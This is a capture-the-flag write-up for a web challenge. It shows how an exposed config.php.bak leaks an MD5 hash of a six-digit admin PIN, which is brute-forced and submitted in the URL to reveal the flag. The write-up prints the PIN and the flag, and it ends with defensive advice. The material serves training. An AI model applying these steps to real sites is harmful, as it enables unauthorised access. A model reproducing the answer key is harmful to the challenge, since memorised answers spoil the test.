# Hasty Comparison

**Challenge title:** Comparaison Hâtive\
**Category:** Web\
**Difficulty:** Medium\
**Points:** 100\
**Author:** Perceval

## File

- Application: http://comparaison-hative.cyberzerk.fr:8080/

## Solution

### Step 1: Inspect the page source

Inspect the HTML source of the portal. A developer comment revealed that a backup file had been left in the web root:

```html
<!-- TODO Didier: virer la sauvegarde config.php.bak avant la prod, elle traine a la racine. -->
```

The page also disclosed that the administrator PIN contained six digits.

### Step 2: Retrieve the exposed backup file

Request the backup file:

```bash
curl http://comparaison-hative.cyberzerk.fr:8080/config.php.bak
```

The file contained the administrator PIN's MD5 hash:

```php
$PIN_HASH = "1a31076f2aeb1e7d69120c9f85c3a8da";
```

### Step 3: Crack the six-digit PIN

Since the PIN was exactly six digits, test the possible values from `000000` to `999999` against the exposed MD5 hash.

The matching PIN was:

```text
496135
```

It can be verified with:

```bash
echo -n "496135" | md5sum
```

The resulting hash is:

```text
1a31076f2aeb1e7d69120c9f85c3a8da
```

### Step 4: Access the manager portal

Submit the recovered PIN through the `pin` URL parameter:

```text
http://comparaison-hative.cyberzerk.fr:8080/?pin=496135
```

The portal accepted the PIN and displayed:

```text
Correct PIN. Welcome, manager.
Access token retrieved
```

### Step 5: Obtain the flag

The flag was displayed after successful authentication.

## Flag

```text
CyberZerk{un3_sauv3g4rd3_.bak_tr4h1t_l3_pin}
```

## Security Lesson

This challenge demonstrates information disclosure through an exposed backup file and weak credential storage. The publicly accessible `config.php.bak` file revealed the MD5 hash of a six-digit administrator PIN, making offline brute-force recovery practical.

Do not leave configuration backups in the web root. Store secrets outside publicly accessible directories, use strong randomly generated credentials, and use a password-hashing scheme designed for secrets that require protection rather than fast general-purpose hashes such as MD5.
